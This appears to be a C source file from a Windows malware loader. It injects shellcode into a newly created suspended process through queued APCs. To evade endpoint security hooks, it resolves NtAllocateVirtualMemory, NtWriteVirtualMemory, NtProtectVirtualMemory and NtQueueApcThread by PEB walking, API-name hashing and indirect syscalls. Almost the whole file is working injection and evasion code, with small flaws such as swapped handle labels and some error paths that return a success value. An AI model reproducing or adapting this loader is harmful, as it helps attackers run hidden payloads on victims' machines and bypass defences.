#include "APC.h"
#include "box.h"

#pragma warning (disable:4996)


BOOL CreateSuspendedProcess
(
	IN LPCSTR ProcessName,
	OUT PHANDLE hProcess,
	OUT PHANDLE hThread,
	OUT PDWORD PID
)
{

	BOOL				State = TRUE;
	STARTUPINFOA		StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	if (!CreateProcessA(NULL, ProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		WARN("CreateProcessA: %ld", GetLastError());
		State = FALSE; goto CLEANUP;
	}

	if (!ProcessInfo.hProcess)
	{
		WARN("Failed to Create Process");
		State = FALSE; goto CLEANUP;
	}

	INFO("[0x%p] Thread Handle", ProcessInfo.hProcess);
	INFO("[0x%p] Process Handle", ProcessInfo.hThread);
	INFO("[%d] Process ID", ProcessInfo.dwProcessId);

	*PID = ProcessInfo.dwProcessId;
	*hProcess = ProcessInfo.hProcess;
	*hThread = ProcessInfo.hThread;


CLEANUP:

	return State;

}

BOOL ApcInject
(
	IN HANDLE hProcess,
	IN HANDLE hThread,
	IN BYTE* pShellcode,
	IN SIZE_T sShellSize
)

{

	NTSTATUS				STATUS			= STATUS_SUCCESS;
	BOOL					State			= TRUE;
	PVOID					rBuffer			= NULL;
	HANDLE					NtdllHandle		= NULL;
	SIZE_T					sBytesWritten	= 0;
	DWORD					dwOldProt		= 0;
	PUCHAR					localBuf		= NULL;
	SIZE_T					origSize		= sShellSize;
	SIZE_T					regionSize		= sShellSize;
	PIMAGE_EXPORT_DIRECTORY pImgDir			= NULL;
	SYSCALL_INFO			info			= { 0 };
	INSTRUCTIONS_INFO		syscallInfos[4] = { 0 };


	localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sShellSize);
	if (!localBuf) {
		WARN("HeapAlloc failed");
		return FALSE;
	}
	memcpy(localBuf, pShellcode, sShellSize);

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtQueueApcThread"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = sdbmrol16(
			Functions[i]
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	/*----------------------------------------------------------[Allocating Virtual Memory]------------------------------------------------------*/

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
		(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Allocated [%zu] Bytes to Virtual Memory!", sShellSize);

	/*-----------------------------------------------------------[Writing Virtual Memory]------------------------------------------------------------*/

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, rBuffer, localBuf, origSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}


	OKAY("Wrote [%zu] Bytes to Virtual Memory", sShellSize);

	/*----------------------------------------------------------[Changing Protecting Permissions]-----------------------------------------------------*/
	
	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtProtectVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG))SyscallInvoker)
		(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	INFO("Changed Allocation Protection from [RW] to [RX]");

	/*------------------------------------------------------------[Queue User APC]---------------------------------------------------------------------------*/
	
	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtQueueApcThread
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, PVOID, PVOID))SyscallInvoker)
		(hThread, (PPS_APC_ROUTINE)rBuffer, NULL, NULL, NULL);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQueueApcThread Failed! With an Error: 0x%0.8x", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	OKAY("[ 0x%p ] Executed payload using NtQueueApcThread", rBuffer);

	if (hProcess)
		CloseHandle(hProcess);

	if (hThread)
		CloseHandle(hThread);

	if (rBuffer)
		VirtualFree(rBuffer, 0, MEM_RELEASE);

	return TRUE;

}